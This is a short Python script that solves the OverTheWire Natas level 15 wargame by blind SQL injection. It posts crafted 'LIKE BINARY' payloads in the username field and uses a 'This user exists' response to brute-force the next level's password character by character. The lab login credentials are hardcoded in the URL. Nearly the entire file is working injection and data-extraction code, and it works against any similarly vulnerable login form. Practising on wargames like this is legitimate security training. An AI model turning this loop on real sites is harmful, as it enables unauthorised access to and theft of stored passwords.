# Blind SQLi with requests library
import requests
alphabet = ''
alphabet += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
alphabet += 'abcdefghijklmnopqrstuvwxyz'
alphabet += '0123456789'

#credentials = {'username': 'natas15', 'password': 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'}
url = "http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org"
check = "This user exists"

filtered = ''
for payload in alphabet:
	filtering = {"username": 'natas16" and password LIKE BINARY "%{}%'.format(payload)}
	response = requests.post(url, data=filtering)
	if check in response.text:
		print "Found {}".format(payload)
		filtered += payload 
print filtered

filtered = 'ABCEHIJMNOPQRTWabcehijmnopqrtw03569'

flag = ''
for i in range(0,32): # Flag is 32chars
	for letter  in filtered:
			#print "Testing {}".format(flag+letter)
			payload = {"username": 'natas16" and password LIKE BINARY "{}%'.format(flag+letter)}
			response = requests.post(url, data=payload)

			if check in response.text:
				flag +=letter
				print "Flag ({}) : {}".format(str(len(flag)), flag)
		


